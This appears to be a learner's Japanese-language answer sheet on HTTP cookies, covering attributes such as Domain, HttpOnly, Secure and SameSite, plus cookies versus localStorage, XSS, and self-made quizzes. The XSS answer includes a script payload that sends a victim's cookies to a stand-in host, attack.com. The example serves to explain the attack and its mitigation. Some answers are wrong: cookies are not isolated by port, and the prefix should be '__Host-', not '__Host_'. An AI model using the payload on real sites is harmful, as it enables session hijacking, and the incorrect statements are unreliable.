# 【回答】クッキーを理解する

## 課題1

### クッキーとは何でしょうか？「Set-cookie」「ヘッダ」「サーバ」「ブラウザ」という単語を使って、クッキーの仕組みを説明してみてください

Webサーバーからブラウザに送信され、ブラウザに保存されるデータのこと。以降クライアントからサーバへのリクエストには保存されたCookieが添付される。ユーザーのセッション情報・データの管理に使われることが多い。

サーバからクライアントへのレスポンスにHTTPヘッダ`Set-Cookie: <cookie-name>=<cookie-value>`を設定すると、クライアントのブラウザにCookie（名前と値の組み合わせ）が保存される。以降クライアントからサーバーへのリクエストにはHTTPヘッダ`Cookie: <cookie-name>=<cookie-value>`が設定される。

### www.hoge.comで発行されたクッキーは、www.fuga.comにも送信されるでしょうか？その理由を説明してください

送信されない。オリジンが異なるため。

### hoge.com:8080のクッキーはhoge.com:9090にも送信されるでしょうか？

送信されない。オリジンが異なるため。

### www.hoge.comで発行されたクッキーは、www.api.hoge.comにも送信されるでしょうか？

送信されない。オリジンが異なるため。

### クッキーにDomain="hoge.com"を指定した場合、api.hoge.comにもクッキーは送信されるでしょうか？理由を説明してください

送信される。Domain属性が設定された場合、サブドメイン間でもCookieが送られるようになるため。

### ブラウザで実行されるJavaScriptは場合によってはクッキーの値を取得できます。JavaScriptからクッキーの値が取得されることを防ぐことは可能でしょうか？どうすれば良いのでしょうか？

可能。Cookieに`HttpOnly`属性を設定する。

### HTTPS（暗号化）通信の時だけクッキーを送信することは可能でしょうか？どうすれば良いのでしょうか？

可能。`Secure`属性を設定する。

### クッキーにExpiresを設定すると、どのように挙動が変わるでしょうか？

Cookieに有効期限が設定され、有効期限が過ぎたCookieは無効になる。

### SameSite属性について説明してください

`Strict`、`Lax`、`None`の3段階の値を指定して、オリジン間のCookieの送信可否を制限することができる。

```
Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Strict
Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Lax
Set-Cookie: <cookie-name>=<cookie-value>; SameSite=None
```

1. サイトAでHTTPヘッダ`Set-Cookie`でCookieを発行（ここで`SameSite`属性を設定する）
2. 外部サイトB（Aとは別ドメイン）に遷移
3. サイトAに遷移

する場合、B→Aの遷移でHTTPヘッダ`Cookie`でCookieを送信するかどうかを制限できる。

- Strict … Cookieは送信されない。
- Lax … GETリクエストの場合のみCookieを送信する。MDN Web Docsではモダンブラウザ（例えばChromeであればver 80から）のデフォルト値とされている。
- None … どのようなリクエストであってもCookieを送信する。（Chrome 80からは、`Samesite=None`を設定する場合は`Secure`属性の設定が必須になる）

SameSite属性にStrictもしくはLaxを設定することで、悪意のあるCookie設定がしにくくなり、CSRF対策になる。

### クッキーに格納しない方が良い情報の例を、3つ以上挙げてください

- **公開されてはいけない情報** … Cookieの情報は、ブラウザの機能を使うことですべてのユーザーが見ることができる情報なので、システム内部の情報など、脆弱性に繋がる可能性のある情報は格納しないほうがよい
- **変更されてはいけない情報** … Cookieの情報は、ブラウザの機能を使うことですべてのユーザーが変更することができる情報なので、変更されることによってシステムに不可逆な影響を与えてしまうような情報は格納しないほうがよい
- **Cookieで保存するメリットがない情報** … Cookieは送信しないことを明示的に示さない限り全てのリクエストといっしょに添付されるようになるので、Cookieに格納する情報が増えればサーバーとクライアントの間でやりとりされるデータの量は急増する。クライアントの数が増えるとやり取りされるデータの量は更に増えるため、パフォーマンスやスケーラビリティを考慮すると、必要ない場合はCookieは利用しないほうがよい

### クッキーはローカルストレージと混同されることが多々あります。クッキーを使うべきタイミングと、ローカルストレージを使うべきタイミングを挙げてみてください

- **Cookieを使うべきタイミング** … セッションIDやトークンなどの重要なデータを保存したいタイミング。Cookieであれば属性を設定することで情報を暗号化したり有効期限を設定したりして、（localStorageと比べて）情報をセキュアに取り扱うことができる
- **localStorageを使うべきタイミング** … ブラウザに保存したいが、データ量が大きいなどの理由でサーバーとのやりとりを最小限にしたい、かつ、どこかに公開されたり変更されたりしても問題ないデータ

### stack overflowのようなWEB掲示板サービスを開発しているとしましょう。XSS（クロスサイトスクリプティング）により、他ユーザのクッキー情報が抜き出される仕組みを説明してください。どのような対策が考えられますか？

`<script>`などの文字列を書き込まれてしまった場合に、ユーザーがページを表示しようとする時点でそのスクリプトが実行されてしまうような作りになってしまっていた場合

1. サイトに表示するためのテキストを入力するフォームに、悪意のあるユーザーが下記のようなスクリプトを入力する

   ```
   <script>
     window.location="https://attack.com?"+document.cookie;
   </script>
   ```

2. 上記のスクリプトが仕込まれたページにユーザーがアクセスしてしまうと、attack.comにそのユーザーのcookieがクエリパラメータとして送信されてしまう

これを防ぐためには、`<`や`&`などのスクリプトを仕込むための文字のエスケープ処理を十分に用意する必要がある。

## 課題2

### クイズ1

`Set-Cookie`ヘッダに`Domain`を設定しなかった場合と`Domain=mozilla.org`を設定した場合との挙動の比較として、正しい説明はどれか

A.

- `Domain`を設定しなかった場合、`mozilla.org`と`developer.mozilla.org`のどちらもCookieを受信することができる
- `Domain=mozilla.org`を設定した場合、`mozilla.org`のみCookieを受信することができる

B. 

- `Domain`を設定しなかった場合、`mozilla.org`のみCookieを受信することができる
- `Domain=mozilla.org`を設定した場合、`mozilla.org`と`developer.mozilla.org`のどちらもCookieを受信することができる

<details>
  <summary>回答</summary>
  B<br />
  Domainを指定すると、省略した場合より制限が緩和されるため注意
</details>

### クイズ2

`Set-Cookie`ヘッダに`Expire`属性と`Max-Age`属性の両方を設定した場合、どちらが優先されるか

<details>
  <summary>回答</summary>
   Max-Age属性が優先される
</details>

### クイズ3

`Domain`属性が設定されている場合ブラウザに拒否されるようにするためには、Cookieをどのように設定すればよいか

<details>
  <summary>回答</summary>
  Cookieの名前に接頭辞<code>__Host_</code>をつける
</details>

